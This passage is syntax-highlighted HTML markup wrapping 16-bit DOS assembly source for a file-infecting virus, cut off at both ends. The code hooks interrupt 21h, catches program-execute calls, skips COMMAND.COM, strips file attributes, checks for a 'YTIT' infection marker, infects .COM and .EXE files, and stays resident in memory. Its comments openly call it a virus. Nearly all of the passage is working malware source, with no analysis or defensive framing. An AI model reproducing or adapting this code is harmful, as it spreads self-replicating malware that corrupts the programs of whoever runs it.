        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ES_Store_1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ES_Store_2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ES_Store_3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">144h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">        </span><span class="sc1">;Re-Execute the file</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_21</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Call Int 21 to Execute file.</span><span class="sc0">

</span><span class="sc5">Go_TSR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Terminate and Stay Resident.</span><span class="sc0">

</span><span class="sc5">Int_21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">              </span><span class="sc1">;Push flags</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F1F1h</span><span class="sc0">          </span><span class="sc1">;Is it an Install Check?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Is_It_Execute</span><span class="sc0">      </span><span class="sc1">;No, Go Is_It_Execute</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F1F1h</span><span class="sc0">          </span><span class="sc1">;Yes, save value (unneccesary)</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                </span><span class="sc1">;Return to virus in program.</span><span class="sc0">

</span><span class="sc5">Is_It_Execute</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">        </span><span class="sc1">;Is it a Load &amp; Execute call?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Restore_Host</span><span class="sc0">        </span><span class="sc1">;Nope, continue on.</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">execute</span><span class="sc0">      </span><span class="sc1">;Infect the file if possible.</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Go_Int_21</span><span class="sc0">  </span><span class="sc1">;And go to old Int 21 handler.</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">Restore_Host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0CBh</span><span class="sc0">      </span><span class="sc1">;Is it a request to restore</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Go_Int_21</span><span class="sc0">          </span><span class="sc1">;control to host?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;Pop flags + Old IP (not kept)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_Save</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_Save</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">          </span><span class="sc1">;Restore Host to orig. Pos.</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                </span><span class="sc1">;Completely remove old Int call</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_Save</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Jump to Host:100</span><span class="sc0">
</span><span class="sc5">Go_Int_21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                </span><span class="sc1">; Pop flags</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ea</span><span class="sc0">          </span><span class="sc1">;Jump to Int 21</span><span class="sc0">
</span><span class="sc5">IP_21</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">040ebh</span><span class="sc0">
</span><span class="sc5">CS_21</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0011</span><span class="sc0">


</span><span class="sc5">execute</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Name_Seg</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Name_Off</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">        </span><span class="sc1">;Get Int 24 Address</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;(Critical Error)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_24</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CS_24</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int_24</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Set Int 24</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Name_Seg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Name_Off</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Name_Check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;Is the first byte a zero?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Name_Check</span><span class="sc0">        </span><span class="sc1">;Nope, find end of string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc0">        </span><span class="sc1">;'M'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Is_Com</span><span class="sc0">        </span><span class="sc1">;COM file, jump Is_Com</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">        </span><span class="sc1">;'E'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Is_EXE</span><span class="sc0">        </span><span class="sc1">;EXE file, jump Is_EXE</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Clean_Up</span><span class="sc0">        </span><span class="sc1">;Neither? Go Clean_Up</span><span class="sc0">
</span><span class="sc5">Is_Com</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Type</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0">      </span><span class="sc1">;Save File type for later.</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Check_If_Command</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">Is_EXE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Type</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">

</span><span class="sc5">Check_If_Command</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Command</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">        </span><span class="sc1">;Is it Command.COM?</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Start_Infect</span><span class="sc0">        </span><span class="sc1">;No, Jump Start_Infect</span><span class="sc0">
</span><span class="sc5">Got_An_Error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Clean_Up</span><span class="sc0">        </span><span class="sc1">;Is Command, get otta here.</span><span class="sc0">

</span><span class="sc5">Start_Infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Name_Seg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Name_Off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Get Attribs</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Got_An_Error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Attribs</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Zero Attrib's for read/write</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Got_An_Error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Open Read/Write</span><span class="sc0">

        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">Check_Infect</span><span class="sc0">    </span><span class="sc1">;Everything Fine? go Check_Infect</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Reset_Attribs</span><span class="sc0">       </span><span class="sc1">;Couldn't Open, go Reset_Attribs</span><span class="sc0">

</span><span class="sc5">Check_Infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0FFFCh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Move to 4 bytes from end</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Size_Off</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer_For_Checks</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                        </span><span class="sc1">;Read in Last 4 bytes of file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Marker</span><span class="sc0">       </span><span class="sc1">;are last 4 bytes 'YTIT'?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer_For_Checks</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Check_Which_Type</span><span class="sc0">   </span><span class="sc1">;Not infected? Go Check_Which_Type</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">       </span><span class="sc1">;Infected? Go Close_File</span><span class="sc0">

</span><span class="sc5">Check_Which_Type</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Type</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0">      </span><span class="sc1">;Is it a .COM?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">COM_Infect</span><span class="sc0">        </span><span class="sc1">;Yes, go COM_Infect</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EXE_Infect</span><span class="sc0">        </span><span class="sc1">;No, go EXE_Infect</span><span class="sc0">

</span><span class="sc5">COM_Infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Allocate 64k of memory</span><span class="sc0">

        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">Load_In_File</span><span class="sc0">        </span><span class="sc1">;No Prob? Go Load_In_File</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">        </span><span class="sc1">;Otherwise, go Close_File</span><span class="sc0">

</span><span class="sc5">Load_In_File</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Mem_Seg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Go to beginning of file</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Mem_Seg</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">700h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Mem_Seg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Size_Off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">700h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">        </span><span class="sc1">;Load entire file to directly</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;after virus.</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Move to the beginning of file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Size_Off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Write entire file back to disk</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Go_Release_Mem</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Move to end of file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Size_Seg</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;COM &lt; 64k</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;Add 4 for marker bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Size_Off</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;Save file size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Marker</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Write in marker 'YTIT'</span><span class="sc0">

</span><span class="sc5">Go_Release_Mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Release_Mem</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">

</span><span class="sc5">EXE_Infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Move to beginning of file</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc4">,</span><span class="sc2">1bh</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">    </span><span class="sc1">;lea     dx,cs:[11Bh]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Read in .EXE header</span><span class="sc0">

</span><span class="sc5">Save_Header_NFO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">                </span><span class="sc1">;clear ints</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Init_CS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CS_Store</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;Save old CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Init_IP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_Save</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;Save old IP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Init_SS</span><span class="sc4">]</span><span class="sc0">
